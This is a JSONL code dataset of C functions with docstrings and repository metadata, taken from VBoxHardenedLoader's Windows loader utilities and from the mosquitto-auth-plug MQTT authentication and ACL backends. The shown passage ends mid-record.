{"docstring": "/*\n* supWriteBufferToFile\n*\n* Purpose:\n*\n* Create new file (or open existing) and write (append) buffer to it.\n*\n*/\n", "func_signal": "SIZE_T supWriteBufferToFile(\n    _In_ PWSTR lpFileName,\n    _In_ PVOID Buffer,\n    _In_ SIZE_T Size,\n    _In_ BOOL Flush,\n    _In_ BOOL Append,\n    _Out_opt_ NTSTATUS* Result\n)", "code": "{\n    NTSTATUS           Status = STATUS_UNSUCCESSFUL;\n    DWORD              dwFlag;\n    HANDLE             hFile = NULL;\n    OBJECT_ATTRIBUTES  attr;\n    UNICODE_STRING     NtFileName;\n    IO_STATUS_BLOCK    IoStatus;\n    LARGE_INTEGER      Position;\n    ACCESS_MASK        DesiredAccess;\n    PLARGE_INTEGER     pPosition = NULL;\n    ULONG_PTR          nBlocks, BlockIndex;\n    ULONG              BlockSize, RemainingSize;\n    PBYTE              ptr = (PBYTE)Buffer;\n    SIZE_T             BytesWritten = 0;\n\n    if (Result)\n        *Result = STATUS_UNSUCCESSFUL;\n\n    if (RtlDosPathNameToNtPathName_U(lpFileName, &NtFileName, NULL, NULL) == FALSE) {\n        if (Result)\n            *Result = STATUS_INVALID_PARAMETER_1;\n        return 0;\n    }\n\n    DesiredAccess = FILE_WRITE_ACCESS | SYNCHRONIZE;\n    dwFlag = FILE_OVERWRITE_IF;\n\n    if (Append != FALSE) {\n        DesiredAccess |= FILE_READ_ACCESS;\n        dwFlag = FILE_OPEN_IF;\n    }\n\n    InitializeObjectAttributes(&attr, &NtFileName, OBJ_CASE_INSENSITIVE, 0, NULL);\n\n    __try {\n        Status = NtCreateFile(&hFile, DesiredAccess, &attr,\n            &IoStatus, NULL, FILE_ATTRIBUTE_NORMAL, 0, dwFlag,\n            FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE, NULL, 0);\n\n        if (!NT_SUCCESS(Status))\n            __leave;\n\n        pPosition = NULL;\n\n        if (Append != FALSE) {\n            Position.LowPart = FILE_WRITE_TO_END_OF_FILE;\n            Position.HighPart = -1;\n            pPosition = &Position;\n        }\n\n        if (Size < 0x80000000) {\n            BlockSize = (ULONG)Size;\n            Status = NtWriteFile(hFile, 0, NULL, NULL, &IoStatus, ptr, BlockSize, pPosition, NULL);\n            if (!NT_SUCCESS(Status))\n                __leave;\n\n            BytesWritten += IoStatus.Information;\n        }\n        else {\n            BlockSize = 0x7FFFFFFF;\n            nBlocks = (Size / BlockSize);\n            for (BlockIndex = 0; BlockIndex < nBlocks; BlockIndex++) {\n\n                Status = NtWriteFile(hFile, 0, NULL, NULL, &IoStatus, ptr, BlockSize, pPosition, NULL);\n                if (!NT_SUCCESS(Status))\n                    __leave;\n\n                ptr += BlockSize;\n                BytesWritten += IoStatus.Information;\n            }\n            RemainingSize = (ULONG)(Size % BlockSize);\n            if (RemainingSize != 0) {\n                Status = NtWriteFile(hFile, 0, NULL, NULL, &IoStatus, ptr, RemainingSize, pPosition, NULL);\n                if (!NT_SUCCESS(Status))\n                    __leave;\n                BytesWritten += IoStatus.Information;\n            }\n        }\n    }\n    __finally {\n        if (hFile != NULL) {\n            if (Flush != FALSE) NtFlushBuffersFile(hFile, &IoStatus);\n            NtClose(hFile);\n        }\n        RtlFreeUnicodeString(&NtFileName);\n        if (Result) *Result = Status;\n    }\n    return BytesWritten;\n}", "path": "VBoxHardenedLoader/Source/Zekamashi_v2/loader/sup.c", "commit_date": "2020-05-14 00:00:00", "repo_name": "hfiref0x/VBoxHardenedLoader", "stars": 897, "license": "bsd-2-clause", "language": "c", "size": 23953}
{"docstring": "/*\n* supUserIsFullAdmin\n*\n* Purpose:\n*\n* Tests if the current user is admin with full access token.\n*\n*/\n", "func_signal": "BOOL supUserIsFullAdmin(\n    VOID\n)", "code": "{\n    BOOL     bResult = FALSE;\n    HANDLE   hToken = NULL;\n    NTSTATUS status;\n    DWORD    i, Attributes;\n    ULONG    ReturnLength = 0;\n\n    PTOKEN_GROUPS pTkGroups;\n\n    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;\n    PSID AdministratorsGroup = NULL;\n\n    hToken = supGetCurrentProcessToken();\n    if (hToken == NULL)\n        return FALSE;\n\n    do {\n        if (!NT_SUCCESS(RtlAllocateAndInitializeSid(\n            &NtAuthority,\n            2,\n            SECURITY_BUILTIN_DOMAIN_RID,\n            DOMAIN_ALIAS_RID_ADMINS,\n            0, 0, 0, 0, 0, 0,\n            &AdministratorsGroup)))\n        {\n            break;\n        }\n\n        status = NtQueryInformationToken(hToken, TokenGroups, NULL, 0, &ReturnLength);\n        if (status != STATUS_BUFFER_TOO_SMALL)\n            break;\n\n        pTkGroups = (PTOKEN_GROUPS)supHeapAlloc((SIZE_T)ReturnLength);\n        if (pTkGroups == NULL)\n            break;\n\n        status = NtQueryInformationToken(hToken, TokenGroups, pTkGroups, ReturnLength, &ReturnLength);\n        if (NT_SUCCESS(status)) {\n            if (pTkGroups->GroupCount > 0)\n                for (i = 0; i < pTkGroups->GroupCount; i++) {\n                    Attributes = pTkGroups->Groups[i].Attributes;\n                    if (RtlEqualSid(AdministratorsGroup, pTkGroups->Groups[i].Sid))\n                        if (\n                            (Attributes & SE_GROUP_ENABLED) &&\n                            (!(Attributes & SE_GROUP_USE_FOR_DENY_ONLY))\n                            )\n                        {\n                            bResult = TRUE;\n                            break;\n                        }\n                }\n        }\n        supHeapFree(pTkGroups);\n\n    } while (FALSE);\n\n    if (AdministratorsGroup != NULL) {\n        RtlFreeSid(AdministratorsGroup);\n    }\n\n    NtClose(hToken);\n    return bResult;\n}", "path": "VBoxHardenedLoader/Source/Zekamashi_v2/loader/sup.c", "commit_date": "2020-05-14 00:00:00", "repo_name": "hfiref0x/VBoxHardenedLoader", "stars": 897, "license": "bsd-2-clause", "language": "c", "size": 23953}
{"docstring": "/*\n* supQueryHVCIState\n*\n* Purpose:\n*\n* Query HVCI/IUM state.\n*\n*/\n", "func_signal": "BOOLEAN supQueryHVCIState(\n    _Out_ PBOOLEAN pbHVCIEnabled,\n    _Out_ PBOOLEAN pbHVCIStrictMode,\n    _Out_ PBOOLEAN pbHVCIIUMEnabled\n)", "code": "{\n    BOOLEAN hvciEnabled;\n    ULONG ReturnLength;\n    SYSTEM_CODEINTEGRITY_INFORMATION CodeIntegrity;\n\n    if (pbHVCIEnabled) *pbHVCIEnabled = FALSE;\n    if (pbHVCIStrictMode) *pbHVCIStrictMode = FALSE;\n    if (pbHVCIIUMEnabled) *pbHVCIIUMEnabled = FALSE;\n\n    CodeIntegrity.Length = sizeof(CodeIntegrity);\n    if (NT_SUCCESS(NtQuerySystemInformation(\n        SystemCodeIntegrityInformation,\n        &CodeIntegrity,\n        sizeof(CodeIntegrity),\n        &ReturnLength)))\n    {\n        hvciEnabled = ((CodeIntegrity.CodeIntegrityOptions & CODEINTEGRITY_OPTION_ENABLED) &&\n            (CodeIntegrity.CodeIntegrityOptions & CODEINTEGRITY_OPTION_HVCI_KMCI_ENABLED));\n\n        if (pbHVCIEnabled)\n            *pbHVCIEnabled = hvciEnabled;\n\n        if (pbHVCIStrictMode)\n            *pbHVCIStrictMode = hvciEnabled &&\n            (CodeIntegrity.CodeIntegrityOptions & CODEINTEGRITY_OPTION_HVCI_KMCI_STRICTMODE_ENABLED);\n\n        if (pbHVCIIUMEnabled)\n            *pbHVCIIUMEnabled = (CodeIntegrity.CodeIntegrityOptions & CODEINTEGRITY_OPTION_HVCI_IUM_ENABLED) > 0;\n\n        return TRUE;\n    }\n\n    return FALSE;\n}", "path": "VBoxHardenedLoader/Source/Zekamashi_v2/loader/sup.c", "commit_date": "2020-05-14 00:00:00", "repo_name": "hfiref0x/VBoxHardenedLoader", "stars": 897, "license": "bsd-2-clause", "language": "c", "size": 23953}
{"docstring": "/*\n* supGetProcAddress\n*\n* Purpose:\n*\n* Get NtOskrnl procedure address.\n*\n*/\n", "func_signal": "ULONG_PTR supGetProcAddress(\n    _In_ ULONG_PTR KernelBase,\n    _In_ ULONG_PTR KernelImage,\n    _In_ LPCSTR FunctionName\n)", "code": "{\n    ANSI_STRING    cStr;\n    ULONG_PTR      pfn = 0;\n\n    RtlInitString(&cStr, FunctionName);\n    if (!NT_SUCCESS(LdrGetProcedureAddress((PVOID)KernelImage, &cStr, 0, (PVOID*)&pfn)))\n        return 0;\n\n    return KernelBase + (pfn - KernelImage);\n}", "path": "VBoxHardenedLoader/Source/Zekamashi_v2/loader/sup.c", "commit_date": "2020-05-14 00:00:00", "repo_name": "hfiref0x/VBoxHardenedLoader", "stars": 897, "license": "bsd-2-clause", "language": "c", "size": 23953}
{"docstring": "/*\n* supxCreateDriverEntry\n*\n* Purpose:\n*\n* Creating registry entry for driver.\n*\n*/\n", "func_signal": "NTSTATUS supxCreateDriverEntry(\n    _In_opt_ LPCWSTR DriverPath,\n    _In_ LPCWSTR KeyName\n)", "code": "{\n    NTSTATUS status = STATUS_UNSUCCESSFUL;\n    DWORD dwData, dwResult;\n    HKEY keyHandle = NULL;\n    UNICODE_STRING driverImagePath;\n\n    RtlInitEmptyUnicodeString(&driverImagePath, NULL, 0);\n\n    if (DriverPath) {\n        if (!RtlDosPathNameToNtPathName_U(DriverPath,\n            &driverImagePath,\n            NULL,\n            NULL))\n        {\n            return STATUS_INVALID_PARAMETER_2;\n        }\n    }\n\n    if (ERROR_SUCCESS != RegCreateKeyEx(HKEY_LOCAL_MACHINE,\n        KeyName,\n        0,\n        NULL,\n        REG_OPTION_NON_VOLATILE,\n        KEY_ALL_ACCESS,\n        NULL,\n        &keyHandle,\n        NULL))\n    {\n        status = STATUS_ACCESS_DENIED;\n        goto Cleanup;\n    }\n\n    dwResult = ERROR_SUCCESS;\n\n    do {\n\n        dwData = SERVICE_ERROR_NORMAL;\n        dwResult = RegSetValueEx(keyHandle,\n            TEXT(\"ErrorControl\"),\n            0,\n            REG_DWORD,\n            (BYTE*)&dwData,\n            sizeof(dwData));\n        if (dwResult != ERROR_SUCCESS)\n            break;\n\n        dwData = SERVICE_KERNEL_DRIVER;\n        dwResult = RegSetValueEx(keyHandle,\n            TEXT(\"Type\"),\n            0,\n            REG_DWORD,\n            (BYTE*)&dwData,\n            sizeof(dwData));\n        if (dwResult != ERROR_SUCCESS)\n            break;\n\n        dwData = SERVICE_DEMAND_START;\n        dwResult = RegSetValueEx(keyHandle,\n            TEXT(\"Start\"),\n            0,\n            REG_DWORD,\n            (BYTE*)&dwData,\n            sizeof(dwData));\n\n        if (dwResult != ERROR_SUCCESS)\n            break;\n\n        if (DriverPath) {\n            dwResult = RegSetValueEx(keyHandle,\n                TEXT(\"ImagePath\"),\n                0,\n                REG_EXPAND_SZ,\n                (BYTE*)driverImagePath.Buffer,\n                (DWORD)driverImagePath.Length + sizeof(UNICODE_NULL));\n        }\n\n    } while (FALSE);\n\n    RegCloseKey(keyHandle);\n\n    if (dwResult != ERROR_SUCCESS) {\n        status = STATUS_ACCESS_DENIED;\n    }\n    else\n    {\n        status = STATUS_SUCCESS;\n    }\n\nCleanup:\n    if (DriverPath) {\n        if (driverImagePath.Buffer) {\n            RtlFreeUnicodeString(&driverImagePath);\n        }\n    }\n    return status;\n}", "path": "VBoxHardenedLoader/Source/Zekamashi_v2/loader/sup.c", "commit_date": "2020-05-14 00:00:00", "repo_name": "hfiref0x/VBoxHardenedLoader", "stars": 897, "license": "bsd-2-clause", "language": "c", "size": 23953}
{"docstring": "/* access is desired read/write access\n * granted is what Mosquitto auth-plug actually granted\n */\n", "func_signal": "void acl_cache(const char *clientid, const char *username, const char *topic, int access, int granted, void *userdata)", "code": "{\n\tchar *data;\n\tchar hex[SHA_DIGEST_LENGTH * 2 + 1];\n\tstruct cacheentry *a, *tmp;\n\tstruct userdata *ud = (struct userdata *)userdata;\n\ttime_t cacheseconds = ud->acl_cacheseconds;\n\ttime_t now;\n\n\tif (ud->acl_cacheseconds <= 0) {\n\t\treturn;\n\t}\n\n\tif (ud->acl_cachejitter > 0) {\n\t\tcacheseconds += rand() * (ud->acl_cachejitter * 2) / RAND_MAX - ud->acl_cachejitter;\n\t\tif (cacheseconds <= 0) {\n\t\t\treturn;\n\t\t}\n\t}\n\n\tif (!clientid || !username || !topic) {\n\t\treturn;\n\t}\n\n\tnow = time(NULL);\n\n\tdata = malloc(strlen(clientid) + strlen(username) + strlen(topic) + 20);\n\tsprintf(data, \"%s:%s:%s:%d\", clientid, username, topic, access);\n\thexify(data, hex);\n\tfree(data);\n\n\tHASH_FIND_STR(ud->aclcache, hex, a);\n\tif (a) {\n\t\ta->granted = granted;\n\n\t\tif (time(NULL) > a->expire_time) {\n\t\t\t_log(LOG_DEBUG, \" Expired [%s] for (%s,%s,%d)\", hex, clientid, username, access);\n\t\t\tHASH_DEL(ud->aclcache, a);\n\t\t\tfree(a);\n\t\t}\n\t} else {\n\t\ta = (struct cacheentry *)malloc(sizeof(struct cacheentry));\n\t\tstrcpy(a->hex, hex);\n\t\ta->granted = granted;\n\t\ta->expire_time = now + cacheseconds;\n\t\tHASH_ADD_STR(ud->aclcache, hex, a);\n\t\t_log(LOG_DEBUG, \" Cached  [%s] for (%s,%s,%d)\", hex, clientid, username, access);\n\t}\n\n\t/*\n\t * Check whole cache for items which need deleting. Important with\n\t * clients who show up once only (mosquitto_[sp]ub with variable clientIDs\n\t */\n\n\tHASH_ITER(hh, ud->aclcache, a, tmp) {\n\t\tif (now > a->expire_time) {\n\t\t\t_log(LOG_DEBUG, \" Cleanup [%s]\", a->hex);\n\t\t\tHASH_DEL(ud->aclcache, a);\n\t\t\tfree(a);\n\t\t}\n\t}\n}", "path": "mosquitto-auth-plug/cache.c", "commit_date": "2017-12-14 00:00:00", "repo_name": "jpmens/mosquitto-auth-plug", "stars": 817, "license": "other", "language": "c", "size": 565}
{"docstring": "/*\n * (read|write)?[ \\t]+[^ \\t]+\n */\n", "func_signal": "static acl_entry *read_acl_line(const char *line)", "code": "{\n\tacl_entry *entry;\n\tconst char *pos;\n\tconst char *i;\n\tsize_t len;\n\tint access;\n\n\tif (strncmp(\"read\", line, 4) == 0 && (line[4] == ' ' || line[4] == '\\t')) {\n\t\taccess = MOSQ_ACL_READ;\n\t\tpos = &line[5];\n\t\tfor (; (*pos == ' ' || *pos == '\\t') && *pos != '\\0'; ++pos);\n\t} else if (strncmp(\"write\", line, 5) == 0 && (line[5] == ' ' || line[5] == '\\t')) {\n\t\taccess = MOSQ_ACL_WRITE;\n\t\tpos = &line[6];\n\t\tfor (; (*pos == ' ' || *pos == '\\t') && *pos != '\\0'; ++pos);\n\t} else {\n\t\taccess = MOSQ_ACL_READ | MOSQ_ACL_WRITE;\n\t\tpos = &line[0];\n\t}\n\tfor (len = 0, i = pos; *i != '\\0' && *i != ' ' && *i != '\\t' && *i != '\\r' && *i != '\\n'; ++len, ++i);\n\tentry = (acl_entry *) malloc(sizeof(acl_entry));\n\tdllist_entry_init(&entry->entry);\n\tentry->access = access;\n\tentry->topic = (char *)calloc(len + 1, sizeof(char));\n\tstrncpy(entry->topic, pos, len);\n\tentry->topic[len] = '\\0';\n\treturn entry;\n}", "path": "mosquitto-auth-plug/be-files.c", "commit_date": "2018-11-21 00:00:00", "repo_name": "jpmens/mosquitto-auth-plug", "stars": 817, "license": "other", "language": "c", "size": 565}
{"docstring": "/*\n * Add a key/value pair to the hash.\n */\n", "func_signal": "void p_add(char *name, char *value)", "code": "{\n\tstruct my_opts *mo;\n\n\tmo = (struct my_opts *)malloc(sizeof(struct my_opts));\n\tif (mo == NULL) {\n\t\treturn;\n\t}\n\tmo->name = strdup(name);\n\tmo->value = strdup(value);\n\n\tHASH_ADD_KEYPTR(hh, globalopts, mo->name, strlen(mo->name), mo);\n}", "path": "mosquitto-auth-plug/hash.c", "commit_date": "2017-07-11 00:00:00", "repo_name": "jpmens/mosquitto-auth-plug", "stars": 817, "license": "other", "language": "c", "size": 565}
{"docstring": "/*\n * Check ACL. username is the name of the connected user attempting to access\n * topic is the topic user is trying to access (may contain wildcards) acc is\n * desired type of access: read/write for subscriptions (READ) (1) for\n * publish (WRITE) (2)\n *\n * SELECT topic FROM table WHERE username = '%s' AND (acc & %d)\n * may user SUB or PUB topic?\n *\n * SELECT topic FROM table WHERE username = '%s'\n * ignore ACC\n */\n", "func_signal": "int be_pg_aclcheck(void *handle, const char *clientid, const char *username, const char *topic, int acc)", "code": "{\n\tstruct pg_backend *conf = (struct pg_backend *)handle;\n\tchar *v = NULL;\n\tint match = BACKEND_DEFER;\n\tbool bf;\n\tPGresult *res = NULL;\n\n\t_log(LOG_DEBUG, \"USERNAME: %s, TOPIC: %s, acc: %d\", username, topic, acc);\n\n\n\tif (!conf || !conf->aclquery)\n\t\treturn BACKEND_DEFER;\n\n\tconst int buflen = 11;\n\t//10 for 2^32 + 1\n\tchar accbuffer[buflen];\n\tsnprintf(accbuffer, buflen, \"%d\", acc);\n\n\tconst char *values[2] = {username, accbuffer};\n\tint lengths[2] = {strlen(username), buflen};\n\n\tres = PQexecParams(conf->conn, conf->aclquery, 2, NULL, values, lengths, NULL, 0);\n\n\tif (PQresultStatus(res) != PGRES_TUPLES_OK) {\n\t\tfprintf(stderr, \"%s\\n\", PQresultErrorMessage(res));\n\t\tmatch = BACKEND_ERROR;\n\n\t\t//try to reset connection if failing because of database connection lost\n\t\tif(PQstatus(conf->conn) == CONNECTION_BAD){\n\t\t\t_log(LOG_NOTICE, \"Noticed a postgres connection loss. Trying to reconnect ...\\n\");\n\t\t\t//try to reinitiate the database connection\n\t\t\tPQreset(conf->conn);\n\t\t}\n\n\t\tgoto out;\n\t}\n\tif (PQnfields(res) != 1) {\n\t\tfprintf(stderr, \"numfields not ok\\n\");\n\t\tgoto out;\n\t}\n\tint rec_count = PQntuples(res);\n\tint row = 0;\n\tfor (row = 0; row < rec_count; row++) {\n\t\tif ((v = PQgetvalue(res, row, 0)) != NULL) {\n\n\t\t\t/*\n\t\t\t * Check mosquitto_match_topic. If true, if true, set\n\t\t\t * match and break out of loop.\n\t\t\t */\n\n\t\t\tchar *expanded;\n\n\t\t\tt_expand(clientid, username, v, &expanded);\n\t\t\tif (expanded && *expanded) {\n\t\t\t\tmosquitto_topic_matches_sub(expanded, topic, &bf);\n\t\t\t\tif (bf) match = BACKEND_ALLOW;\n\t\t\t\t_log(LOG_DEBUG, \"  postgres: topic_matches(%s, %s) == %d\",\n\t\t\t\t     expanded, v, bf);\n\n\t\t\t\tfree(expanded);\n\t\t\t}\n\t\t}\n\t\tif (match != BACKEND_DEFER) {\n\t\t\tbreak;\n\t\t}\n\t}\n\nout:\n\n\tPQclear(res);\n\n\treturn (match);\n}", "path": "mosquitto-auth-plug/be-postgres.c", "commit_date": "2018-11-21 00:00:00", "repo_name": "jpmens/mosquitto-auth-plug", "stars": 817, "license": "other", "language": "c", "size": 565}
{"docstring": "/* return: 0 = not found, 1 = error, or record length */\n", "func_signal": "static unsigned\nmatch(struct cdb_make *cdbmp, unsigned pos, const char *key, unsigned klen)", "code": "{\n  int len;\n  unsigned rlen;\n  if (lseek(cdbmp->cdb_fd, pos, SEEK_SET) < 0)\n    return 1;\n  if (read(cdbmp->cdb_fd, cdbmp->cdb_buf, 8) != 8)\n    return 1;\n  if (cdb_unpack(cdbmp->cdb_buf) != klen)\n    return 0;\n\n  /* record length; check its validity */\n  rlen = cdb_unpack(cdbmp->cdb_buf + 4);\n  if (rlen > cdbmp->cdb_dpos - pos - klen - 8)\n    return errno = EPROTO, 1;\t/* someone changed our file? */\n  rlen += klen + 8;\n\n  while(klen) {\n    len = klen > sizeof(cdbmp->cdb_buf) ? sizeof(cdbmp->cdb_buf) : klen;\n    len = read(cdbmp->cdb_fd, cdbmp->cdb_buf, len);\n    if (len <= 0)\n      return 1;\n    if (memcmp(cdbmp->cdb_buf, key, len) != 0)\n      return 0;\n    key += len;\n    klen -= len;\n  }\n\n  return rlen;\n}", "path": "mosquitto-auth-plug/contrib/tinycdb-0.78/cdb_make_put.c", "commit_date": "2013-08-22 00:00:00", "repo_name": "jpmens/mosquitto-auth-plug", "stars": 817, "license": "other", "language": "c", "size": 565}
{"docstring": "/*\n * Check ACL.\n * username is the name of the connected user attempting\n * to access\n * topic is the topic user is trying to access (may contain\n * wildcards)\n * acc is desired type of access: read/write\n *\tfor subscriptions (READ) (1)\n *\tfor publish (WRITE) (2)\n *\n * SELECT topic FROM table WHERE username = '%s' AND (acc & %d)\t\t// may user SUB or PUB topic?\n * SELECT topic FROM table WHERE username = '%s'              \t\t// ignore ACC\n */\n", "func_signal": "int be_ldap_aclcheck(void *handle, const char *clientid, const char *username, const char *topic, int acc)", "code": "{\n\tstruct ldap_backend *conf = (struct ldap_backend *)handle;\n\n\treturn (conf->acldeny ? BACKEND_DENY : BACKEND_ALLOW);\n}", "path": "mosquitto-auth-plug/be-ldap.c", "commit_date": "2018-11-21 00:00:00", "repo_name": "jpmens/mosquitto-auth-plug", "stars": 817, "license": "other", "language": "c", "size": 565}
{"docstring": "// Check an embedded array of the form [ \"public/#\", \"private/myid/#\" ]\n", "func_signal": "bool be_mongo_check_acl_topics_array(const bson_iter_t *topics, const char *req_topic, const char *clientid, const char *username)", "code": "{\n\tbson_iter_t iter;\n\tbson_iter_recurse(topics, &iter);\n\n\twhile (bson_iter_next(&iter)) {\n\t\tconst char *permitted_topic = bson_iter_utf8(&iter, NULL);\n\t\tbool topic_matches = false;\n\n\t\tchar *expanded;\n\n\t\tt_expand(clientid, username, permitted_topic, &expanded);\n\t\tif (expanded && *expanded) {\n\t\t\tmosquitto_topic_matches_sub(expanded, req_topic, &topic_matches);\n\t\t\tfree(expanded);\n\n\t\t\tif (topic_matches) {\n\t\t\t\treturn true;\n\t\t\t}\n\t\t}\n\t}\n\treturn false;\n}", "path": "mosquitto-auth-plug/be-mongo.c", "commit_date": "2018-11-21 00:00:00", "repo_name": "jpmens/mosquitto-auth-plug", "stars": 817, "license": "other", "language": "c", "size": 565}
{"docstring": "/*\n * Recursively free the hash\n */\n", "func_signal": "void p_freeall()", "code": "{\n\tstruct my_opts *mo, *tmp;\n\n\tHASH_ITER(hh, globalopts, mo, tmp) {\n\t\tif (mo->value)\n\t\t\tfree(mo->value);\n\t\tif (mo->name)\n\t\t\tfree(mo->name);\n\t\tHASH_DEL(globalopts, mo);\n\t}\n}", "path": "mosquitto-auth-plug/hash.c", "commit_date": "2017-07-11 00:00:00", "repo_name": "jpmens/mosquitto-auth-plug", "stars": 817, "license": "other", "language": "c", "size": 565}
{"docstring": "/*\n * Open a new connection to LDAP so that we don't lose the exising\n * binddn/pw. Check if the user's `dn' can bind with `password'.\n * Return T/F. `connstr' is a scheme://host:port thing.\n */\n", "func_signal": "static int user_bind(char *connstr, char *dn, const char *password)", "code": "{\n\tLDAP *ld;\n\tint opt, rc;\n\n\tif (ldap_initialize(&ld, connstr) != LDAP_SUCCESS) {\n\t\t_log(1, \"Cannot ldap_initialize-2\");\n\t\treturn (FALSE);\n\t}\n\n\topt = LDAP_VERSION3;\n\tldap_set_option(ld, LDAP_OPT_PROTOCOL_VERSION, &opt);\n\n\tif ((rc = ldap_simple_bind_s(ld, dn, password)) != LDAP_SUCCESS) {\n\t\t_log(1, \"Cannot bind to LDAP as %s: %s\", dn, ldap_err2string(rc));\n\t\treturn (FALSE);\n\t}\n\n\tldap_unbind(ld);\n\treturn (TRUE);\n\n}", "path": "mosquitto-auth-plug/be-ldap.c", "commit_date": "2018-11-21 00:00:00", "repo_name": "jpmens/mosquitto-auth-plug", "stars": 817, "license": "other", "language": "c", "size": 565}
{"docstring": "/*\n * Check access to topic for username. Look values for a key \"acl:username\"\n * and use mosquitto_topic_matches_sub() to validate the topic.\n */\n", "func_signal": "int be_cdb_access(void *handle, const char *username, char *topic)", "code": "{\n\tstruct cdb_backend *conf = (struct cdb_backend *)handle;\n\tchar *k;\n\tunsigned klen;\n\tint found = 0;\n\tstruct cdb_find cdbf;\n\tbool bf;\n\n\tif (!conf || !username || !topic)\n\t\treturn (0);\n\n\tif ((k = malloc(strlen(username) + strlen(\"acl:\") + 2)) == NULL)\n\t\treturn (0);\n\tsprintf(k, \"acl:%s\", username);\n\tklen = strlen(k);\n\n\tcdb_findinit(&cdbf, conf->cdb, k, klen);\n\twhile ((cdb_findnext(&cdbf) > 0) && (!found)) {\n\t\tunsigned vpos = cdb_datapos(conf->cdb);\n\t\tunsigned vlen = cdb_datalen(conf->cdb);\n\t\tchar *val;\n\n\t\tval = malloc(vlen);\n\t\tcdb_read(conf->cdb, val, vlen, vpos);\n\n\t\tmosquitto_topic_matches_sub(val, topic, &bf);\n\t\tfound |= bf;\n\n\t\tfree(val);\n\t}\n\n\tfree(k);\n\n\treturn (found > 0);\n}", "path": "mosquitto-auth-plug/be-cdb.c", "commit_date": "2018-11-21 00:00:00", "repo_name": "jpmens/mosquitto-auth-plug", "stars": 817, "license": "other", "language": "c", "size": 565}
{"docstring": "/*\n * Check ACL. username is the name of the connected user attempting to access\n * topic is the topic user is trying to access (may contain wildcards) acc is\n * desired type of access: read/write for subscriptions (READ) (1) for\n * publish (WRITE) (2)\n * \n * SELECT topic FROM table WHERE username = '%s' AND (acc & %d)\t\t//\n * may user SUB or PUB topic? SELECT topic FROM table WHERE username = '%s'\n * / ignore ACC\n */\n", "func_signal": "int be_mysql_aclcheck(void *handle, const char *clientid, const char *username, const char *topic, int acc)", "code": "{\n\tstruct mysql_backend *conf = (struct mysql_backend *)handle;\n\tchar *query = NULL, *u = NULL, *v;\n\tlong ulen;\n\tint match = BACKEND_DEFER;\n\tbool bf;\n\tMYSQL_RES *res = NULL;\n\tMYSQL_ROW rowdata;\n\n\tif (!conf || !conf->aclquery)\n\t\treturn BACKEND_DEFER;\n\n\tif (mysql_ping(conf->mysql)) {\n\t\tfprintf(stderr, \"%s\\n\", mysql_error(conf->mysql));\n\t\tif (!auto_connect(conf)) {\n\t\t\treturn (BACKEND_ERROR);\n\t\t}\n\t}\n\tif ((u = escape(conf, username, &ulen)) == NULL)\n\t\treturn (BACKEND_ERROR);\n\n\tif ((query = malloc(strlen(conf->aclquery) + ulen + 128)) == NULL) {\n\t\tfree(u);\n\t\treturn (BACKEND_ERROR);\n\t}\n\tsprintf(query, conf->aclquery, u, acc);\n\tfree(u);\n\n\t//_log(LOG_DEBUG, \"SQL: %s\", query);\n\n\tif (mysql_query(conf->mysql, query)) {\n\t\t_log(LOG_NOTICE, \"%s\", mysql_error(conf->mysql));\n\t\tmatch = BACKEND_ERROR;\n\t\tgoto out;\n\t}\n\tres = mysql_store_result(conf->mysql);\n\tif (mysql_num_fields(res) != 1) {\n\t\tfprintf(stderr, \"numfields not ok\\n\");\n\t\tgoto out;\n\t}\n\twhile (match == 0 && (rowdata = mysql_fetch_row(res)) != NULL) {\n\t\tif ((v = rowdata[0]) != NULL) {\n\n\t\t\t/*\n\t\t\t * Check mosquitto_match_topic. If true, if true, set\n\t\t\t * match and break out of loop.\n\t\t\t */\n\n\t\t\tchar *expanded;\n\n\t\t\tt_expand(clientid, username, v, &expanded);\n\t\t\tif (expanded && *expanded) {\n\t\t\t\tmosquitto_topic_matches_sub(expanded, topic, &bf);\n\t\t\t\tif (bf) match = BACKEND_ALLOW;\n\t\t\t\t_log(LOG_DEBUG, \"  mysql: topic_matches(%s, %s) == %d\",\n\t\t\t\t     expanded, v, bf);\n\n\t\t\t\tfree(expanded);\n\t\t\t}\n\t\t}\n\t}\n\nout:\n\n\tmysql_free_result(res);\n\tfree(query);\n\n\treturn (match);\n}", "path": "mosquitto-auth-plug/be-mysql.c", "commit_date": "2018-11-21 00:00:00", "repo_name": "jpmens/mosquitto-auth-plug", "stars": 817, "license": "other", "language": "c", "size": 565}
{"docstring": "/*\n * Return PSK key string for the username\n */\n", "func_signal": "char *be_psk_getuser(void *handle, const char *username, const char *password, int *authenticated)", "code": "{\n\tstruct psk_backend *conf = (struct psk_backend *)handle;\n\n\tif (!conf || !username || !*username)\n\t\treturn (NULL);\n\n\treturn (NULL);\n}", "path": "mosquitto-auth-plug/be-psk.c", "commit_date": "2017-10-06 00:00:00", "repo_name": "jpmens/mosquitto-auth-plug", "stars": 817, "license": "other", "language": "c", "size": 565}
{"docstring": "// Return a new mongoc_uri_t which should be freed with mongoc_uri_destroy\n", "func_signal": "mongoc_uri_t *be_mongo_new_uri_from_options()", "code": "{\n\tconst char *uristr = p_stab(\"mongo_uri\");\n\tconst char *host = p_stab(\"mongo_host\");\n\tconst char *port = p_stab(\"mongo_port\");\n\tconst char *user = p_stab(\"mongo_user\");\n\tconst char *password = p_stab(\"mongo_password\");\n\tconst char *authSource = p_stab(\"mongo_authSource\");\n\tmongoc_uri_t *uri;\n\n\tif (uristr) {\n\t\t// URI string trumps everything else. Let the driver parse it.\n\t\turi = mongoc_uri_new(uristr);\n\t} else if (host || port || user || password || authSource) {\n\t\t// Using legacy piecemeal connection options. Assemble the URI.\n\t\turi = mongoc_uri_new_for_host_port(\n\t\t\thost ? host : \"localhost\",\n\t\t\t(port && atoi(port)) ? atoi(port) : 27017\n\t\t);\n\n\t\t// NB: Option setters require mongo-c-driver >= 1.4.0 (Aug 2016)\n\t\tif (user != NULL) {\n\t\t\tmongoc_uri_set_username(uri, user);\n\t\t\tif (password != NULL) {\n\t\t\t\tmongoc_uri_set_password(uri, password);\n\t\t\t}\n\t\t}\n\t\tif (authSource != NULL) {\n\t\t\tmongoc_uri_set_auth_source(uri, authSource);\n\t\t}\n\t} else {\n\t\t// No connection options given at all, use defaults.\n\t\turi = mongoc_uri_new_for_host_port(\"localhost\", 27017);\n\t}\n\n\treturn uri;\n}", "path": "mosquitto-auth-plug/be-mongo.c", "commit_date": "2018-11-21 00:00:00", "repo_name": "jpmens/mosquitto-auth-plug", "stars": 